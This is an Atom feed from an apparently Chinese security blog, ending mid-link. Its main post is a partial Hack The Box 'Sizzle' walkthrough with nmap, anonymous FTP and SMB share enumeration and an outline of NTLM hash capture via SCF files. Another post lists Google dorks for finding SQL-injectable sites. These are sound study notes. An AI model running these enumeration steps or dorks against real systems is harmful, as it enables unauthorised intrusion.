<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue0cean&#39;s   blog</title>
  
  <subtitle>welcome to my world -- sharing CTF &amp; ML skills</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-08-08T06:20:12.949Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>b1ue0cean</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JNDI-LDAP</title>
    <link href="http://example.com/2022/08/08/JNDI-LDAP/"/>
    <id>http://example.com/2022/08/08/JNDI-LDAP/</id>
    <published>2022-08-08T06:17:35.000Z</published>
    <updated>2022-08-08T06:20:12.949Z</updated>
    
    <content type="html"><![CDATA[<p>照着大师傅们的文章走一遍JNDI打LDAP注入</p><span id="more"></span><p><a href="https://www.freebuf.com/articles/web/253545.html">JNDI之初探LDAP - FreeBuf网络安全行业门户</a></p><p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.freebuf.com/articles/web/199046.html">从RCE到LDAP信息泄漏 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/321801.html">JNDI与RMI、LDAP一二事 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;照着大师傅们的文章走一遍JNDI打LDAP注入&lt;/p&gt;</summary>
    
    
    
    <category term="JNDI" scheme="http://example.com/categories/JNDI/"/>
    
    <category term="LDAP" scheme="http://example.com/categories/JNDI/LDAP/"/>
    
    
    <category term="JNDI" scheme="http://example.com/tags/JNDI/"/>
    
    <category term="LDAP" scheme="http://example.com/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>HTB Sizzle</title>
    <link href="http://example.com/2022/08/08/HTB-Sizzle/"/>
    <id>http://example.com/2022/08/08/HTB-Sizzle/</id>
    <published>2022-08-08T04:57:58.000Z</published>
    <updated>2022-08-08T09:53:54.858Z</updated>
    
    <content type="html"><![CDATA[<p>做个windows靶机</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV -sT -sC -o nmapinitial <span class="number">10.10</span><span class="number">.10</span><span class="number">.103</span></span><br><span class="line">Starting Nmap <span class="number">7.92</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">57</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.103</span></span><br><span class="line">Host is up (<span class="number">0.29</span>s latency).</span><br><span class="line">Not shown: <span class="number">976</span> filtered tcp ports (no-response), <span class="number">11</span> filtered tcp ports (host-unreach)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">21</span>/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">|<span class="type">_ftp</span>-bounce: bounce working!</span><br><span class="line">|<span class="type">_ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| <span class="type">ftp</span>-syst: </span><br><span class="line">|<span class="type">_</span>  SYST: Windows_NT</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">80</span>/tcp   open  http          Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line">|<span class="type">_http</span>-server-header: Microsoft-IIS/<span class="number">10.0</span></span><br><span class="line">| <span class="type">http</span>-methods: </span><br><span class="line">|<span class="type">_</span>  Potentially risky methods: TRACE</span><br><span class="line">|<span class="type">_http</span>-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2018</span><span class="number">-07</span><span class="number">-03</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">56</span>+<span class="number">00</span>:<span class="number">00</span>; <span class="number">-1</span>s from scanner <span class="built_in">time</span>.</span><br><span class="line"><span class="number">443</span>/tcp  open  ssl/http      Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line">|<span class="type">_http</span>-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2018</span><span class="number">-07</span><span class="number">-03</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">54</span>+<span class="number">00</span>:<span class="number">00</span>; <span class="number">-1</span>s from scanner <span class="built_in">time</span>.</span><br><span class="line">| <span class="type">tls</span>-alpn: </span><br><span class="line">|   <span class="type">h2</span></span><br><span class="line">|<span class="type">_</span>  http/<span class="number">1.1</span></span><br><span class="line">|<span class="type">_http</span>-server-header: Microsoft-IIS/<span class="number">10.0</span></span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2018</span><span class="number">-07</span><span class="number">-03</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">54</span>+<span class="number">00</span>:<span class="number">00</span>; <span class="number">-1</span>s from scanner <span class="built_in">time</span>.</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">54</span>+<span class="number">00</span>:<span class="number">00</span>; <span class="number">-1</span>s from scanner <span class="built_in">time</span>.</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2018</span><span class="number">-07</span><span class="number">-03</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line"><span class="number">3269</span>/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">53</span>+<span class="number">00</span>:<span class="number">00</span>; <span class="number">-1</span>s from scanner <span class="built_in">time</span>.</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2018</span><span class="number">-07</span><span class="number">-03</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span>T17:<span class="number">58</span>:<span class="number">55</span></span><br><span class="line">Service <span class="keyword">Info</span>: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| <span class="type">smb2</span>-<span class="built_in">time</span>: </span><br><span class="line">|   <span class="type">date</span>: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T05:<span class="number">03</span>:<span class="number">10</span></span><br><span class="line">|<span class="type">_</span>  start_date: <span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T04:<span class="number">55</span>:<span class="number">46</span></span><br><span class="line">|<span class="type">_clock</span>-skew: mean: <span class="number">-1</span>s, deviation: <span class="number">0</span>s, median: <span class="number">-1</span>s</span><br><span class="line">| <span class="type">smb2</span>-security-mode: </span><br><span class="line">|   <span class="type">3</span><span class="number">.1</span><span class="number">.1</span>: </span><br><span class="line">|<span class="type">_</span>    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">422.88</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到 21 端口有一个任意登陆</p><h1 id="端口测试"><a href="#端口测试" class="headerlink" title="端口测试"></a>端口测试</h1><h2 id="HTTP-80"><a href="#HTTP-80" class="headerlink" title="HTTP 80"></a>HTTP 80</h2><h2 id="FTP-21-tcp"><a href="#FTP-21-tcp" class="headerlink" title="FTP 21/tcp"></a>FTP 21/tcp</h2><p>ftp咋打？</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp <span class="number">10.10</span>.<span class="number">10.103</span></span><br><span class="line">Connected to <span class="number">10.10</span>.<span class="number">10.103</span>.</span><br><span class="line"><span class="number">220</span> Microsoft FTP Service</span><br><span class="line">Name (<span class="number">10.10</span>.<span class="number">10.103</span>:kali): anonymous</span><br><span class="line"><span class="number">331</span> Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span> User logged in.</span><br><span class="line">Remote system <span class="keyword">type</span> <span class="keyword">is</span> Windows_NT.</span><br><span class="line">ftp&gt; dir</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">62993</span>|)</span><br><span class="line"><span class="number">125</span> Data connection already open; Transfer starting.</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br></pre></td></tr></table></figure><p>以前还真没搞过 直接 <code>Name:anonymous</code>  然后不用输入密码就可以登录</p><p>但好像是空的</p><h2 id="LDAP-389-tcp"><a href="#LDAP-389-tcp" class="headerlink" title="LDAP 389/tcp"></a>LDAP 389/tcp</h2><p>这块也没遇到过 （ 我真的好小白啊啊啊</p><h3 id="一、LDAP简介"><a href="#一、LDAP简介" class="headerlink" title="一、LDAP简介"></a><strong>一、LDAP简介</strong></h3><p>LDAP(Lightweight Directory Access Protocol)是轻量级目录访问协议。以信息目录的形式存在，在该目录中可只定义一次用户和组，而在多台机器和多个应用程序间共享它们。LDAP与数据库最大区别在于，数据库以“表格-字段-值”的形是来存储数据，而LDAP以树状形方式访问存储在LDAP目录中的信息。</p><h3 id="二、LDAP目录结构"><a href="#二、LDAP目录结构" class="headerlink" title="二、LDAP目录结构"></a><strong>二、LDAP目录结构</strong></h3><p>LDAP目录以树状的层次结构来存储数据。其结果如下图所示：</p><p><img src="/2022/08/08/HTB-Sizzle/1542693908_5bf3a41472c12.png" alt="QQ截图20181119154533.png"></p><p>dn标志一条记录，描述一条数据的详细路径（比如：人、组织、IP地址等）</p><p>dc表示一条记录所属区域，相当于数据库（比如：中国、美国、韩国等）</p><p>ou表示一条记录所属组织（比如：省份、部门、行业等）</p><p>cn表示一条记录的名字，相当于数据库中的主键即需要查找的目标</p><h3 id="三、LDAP注入"><a href="#三、LDAP注入" class="headerlink" title="三、LDAP注入"></a><strong>三、LDAP注入</strong></h3><p>LDAP具有特定的查询结构，并具有特定的语法，来对特定目录进行遍历，LDAP注入攻击和SQL注入攻击类似，利用用户引入的参数生成LDAP查询，由于部分参数没有适当的过滤，因此攻击者可以注入恶意代码以造城恶意攻击。其常见操作符有<code>=</code>（等于）、<code>＆</code>（逻辑和）、<code>|</code>（逻辑或）、<code>！</code>（逻辑否）、<code>*</code>（通配符）。</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><a href="https://www.freebuf.com/articles/web/318970.html">内网渗透之SMB的利用 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/291348.html">利用SCF文件攻击进行渗透实战 - FreeBuf网络安全行业门户</a></p><p><a href="https://cloud.tencent.com/developer/article/1514901">渗透测试中SMB服务漏洞检查checklist - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h3 id="一、什么是SMB协议"><a href="#一、什么是SMB协议" class="headerlink" title="一、什么是SMB协议:"></a>一、什么是SMB协议:</h3><p>SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口</p><p>内网渗透中smb服务(139,445端口)的利用方式</p><h3 id="二、SMB的利用方式"><a href="#二、SMB的利用方式" class="headerlink" title="二、SMB的利用方式"></a>二、SMB的利用方式</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbmap -H <span class="number">10.10.10.103</span></span><br><span class="line">[+] IP: <span class="number">10.10.10.103</span>:<span class="number">445</span>        Name: <span class="number">10.10.10.103</span> </span><br></pre></td></tr></table></figure><p>好像没啥用</p><h4 id="1-通过NTLM认证进行SMB攻击"><a href="#1-通过NTLM认证进行SMB攻击" class="headerlink" title="1.通过NTLM认证进行SMB攻击"></a>1.通过NTLM认证进行SMB攻击</h4><p>LM和NTLM都是windows中对密码进行hash加密的两种不同的方式。只不过个人系统在windows vista后，服务器在windows server2003之后都采用ntlm hash的方式。使用mimikatz抓取到ntlm hash.</p><p>漏洞利用思路:</p><p>(1)首先需要生成一个.scf的恶意文件(SCF文件是”WINDOWS资源管理器命令”文件,它也是一种可执行文件);</p><p>(2)上传恶意文件让受害者试图访问我们的共享文件，这时responder会作出反应:其提供给我NTLM哈希并且访问资源responder就受到受害者的hash</p><h4 id="2-SMB会话共享加爆破"><a href="#2-SMB会话共享加爆破" class="headerlink" title="2.SMB会话共享加爆破"></a>2.SMB会话共享加爆破</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用smb枚举列出共享的文件: smbclient -L \\xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx</span><br></pre></td></tr></table></figure><p>实践一下</p><p><code>smbclient -L \\10.10.10.103 </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -L \\10.10.10.103</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class="line">        Department Shares Disk      </span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        Operations      Disk      </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用smb枚举列出共享的文件: smbclient -L \\xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx</span><br></pre></td></tr></table></figure><img src="/2022/08/08/HTB-Sizzle/image-20220808144129131.png" alt="image-20220808144129131" style="zoom:50%;"><p>咱也不知道这有没有连上去 反正密码我空着了 。。。</p><p>看了眼 国外大哥的wp</p><p>不得不称赞一句 nb！</p><p>首先一个网站 <a href="https://regex101.com/r/Z7fLRL/2">regex101: build, test, and debug regex</a></p><p><img src="/2022/08/08/HTB-Sizzle/image-20220808150417942.png" alt="image-20220808150417942"></p><p>真的是佩服这老哥 这老哥对linux命令行玩的是真的明白</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient -N -L \\\\10.10.10.103 | grep Disk | sed &#x27;s/^\s*\(.*\)\s*Disk.*/\1/&#x27; | while read share; do echo &quot;======$&#123;share&#125;======&quot;; smbclient -N &quot;//10.10.10.103/$&#123;share&#125;&quot; -c dir; echo; done</span><br><span class="line">do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">======ADMIN$======</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">======C$======</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">======CertEnroll======</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line"></span><br><span class="line">======Department Shares======</span><br><span class="line">  .                                   D       <span class="number"> 0 </span> Tue Jul <span class="number"> 3 </span>11:22:32 2018</span><br><span class="line">  ..                                  D       <span class="number"> 0 </span> Tue Jul <span class="number"> 3 </span>11:22:32 2018</span><br><span class="line">  Accounting                          D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:21:43 2018</span><br><span class="line">  Audit                               D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:14:28 2018</span><br><span class="line">  Banking                             D       <span class="number"> 0 </span> Tue Jul <span class="number"> 3 </span>11:22:39 2018</span><br><span class="line">  CEO_protected                       D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:15:01 2018</span><br><span class="line">  Devops                              D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:19:33 2018</span><br><span class="line">  Finance                             D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:11:57 2018</span><br><span class="line">  HR                                  D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:16:11 2018</span><br><span class="line">  Infosec                             D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:14:24 2018</span><br><span class="line">  Infrastructure                      D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:13:59 2018</span><br><span class="line">  IT                                  D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:12:04 2018</span><br><span class="line">  Legal                               D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:12:09 2018</span><br><span class="line">  M&amp;A                                 D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:15:25 2018</span><br><span class="line">  Marketing                           D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:14:43 2018</span><br><span class="line">  R&amp;D                                 D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:11:47 2018</span><br><span class="line">  Sales                               D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:14:37 2018</span><br><span class="line">  Security                            D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:21:47 2018</span><br><span class="line">  Tax                                 D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:16:54 2018</span><br><span class="line">  Users                               D       <span class="number"> 0 </span> Tue Jul<span class="number"> 10 </span>17:39:32 2018</span><br><span class="line">  ZZ_ARCHIVE                          D       <span class="number"> 0 </span> Mon Jul <span class="number"> 2 </span>15:32:58 2018</span><br><span class="line"></span><br><span class="line">               <span class="number"> 7779839 </span>blocks of size 4096.<span class="number"> 3590132 </span>blocks available</span><br><span class="line"></span><br><span class="line">======NETLOGON======</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line"></span><br><span class="line">======Operations======</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line"></span><br><span class="line">======SYSVOL======</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br></pre></td></tr></table></figure><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#smb---tcp-445">HTB: Sizzle | 0xdf hacks stuff</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做个windows靶机&lt;/p&gt;</summary>
    
    
    
    <category term="HTB" scheme="http://example.com/categories/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/HTB/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTB" scheme="http://example.com/tags/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Helpline</title>
    <link href="http://example.com/2022/08/07/HTB-Helpline/"/>
    <id>http://example.com/2022/08/07/HTB-Helpline/</id>
    <published>2022-08-07T13:05:44.000Z</published>
    <updated>2022-08-08T04:52:21.332Z</updated>
    
    <content type="html"><![CDATA[<p>一直想做一个windows的靶机 这回挑一个</p><span id="more"></span><p>访问不了 草了。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直想做一个windows的靶机 这回挑一个&lt;/p&gt;</summary>
    
    
    
    <category term="HTB" scheme="http://example.com/categories/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/HTB/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTB" scheme="http://example.com/tags/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>springboot漏洞复现</title>
    <link href="http://example.com/2022/08/07/springbootVUL/"/>
    <id>http://example.com/2022/08/07/springbootVUL/</id>
    <published>2022-08-07T12:05:30.000Z</published>
    <updated>2022-08-07T12:07:30.553Z</updated>
    
    <content type="html"><![CDATA[<p>抽时间复现一下 然后去挖src</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;抽时间复现一下 然后去挖src&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>src挖掘学习记录</title>
    <link href="http://example.com/2022/08/07/src-sum/"/>
    <id>http://example.com/2022/08/07/src-sum/</id>
    <published>2022-08-06T17:46:11.000Z</published>
    <updated>2022-08-06T19:24:09.036Z</updated>
    
    <content type="html"><![CDATA[<p>玩了一星期 开始干活了</p><p>这里收录我看到的比较有用的文章 然后根据文章去实践的记录</p><span id="more"></span><p>挖掘的重点应该放在 <code>sql注入、弱口令、cms通杀</code></p><h2 id="sql挖掘实操"><a href="#sql挖掘实操" class="headerlink" title="sql挖掘实操"></a>sql挖掘实操</h2><p><code>inurl:.php?id=</code>、<code>inurl:asp?id=</code>、<code>inurl:Show.asp?Id=</code>等</p><img src="/2022/08/07/src-sum/image-20220807015626772.png" alt="image-20220807015626772" style="zoom: 200%;"><img src="/2022/08/07/src-sum/image-20220807015714769.png" alt="image-20220807015714769" style="zoom:50%;"><img src="/2022/08/07/src-sum/image-20220807015904432.png" alt="image-20220807015904432"><h2 id="任意注册实操"><a href="#任意注册实操" class="headerlink" title="任意注册实操"></a>任意注册实操</h2><blockquote><p>首先先了解什么是任意注册，任意注册是一种程序设计的缺陷，顾名思义就是随便注册，注册处无任何验证。Google语法关键词：地区/行业inurl:”register”地区/行业inurl:”regp.asp”regsave.asp、Reg.asp、userreg.asp、reg1.asp等任意注册算是低危漏洞，不过也有两分。任意注册或许没有那么多人挖，可以尝试去挖掘可以去漏洞盒子提交漏洞的时候，有一个可以选择漏洞类型的，可以尝试去看看，你认为那些漏洞比较冷门没人挖而=而且普遍存在的下手</p></blockquote><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/articles/web/265782.html">来自榜一的公益SRC挖掘思路分享 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/271678.html">实战|从零开始的SRC挖掘——如何一洞百分 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/sectool/158882.html">批量挖SRC漏洞的一种打开方式 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/225770.html">逻辑漏洞小结之SRC篇 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/280826.html">网络安全SRC漏洞挖掘经验总结V1.0 - FreeBuf网络安全行业门户</a></p><p><a href="https://wiki.bylibrary.cn/">首页 - 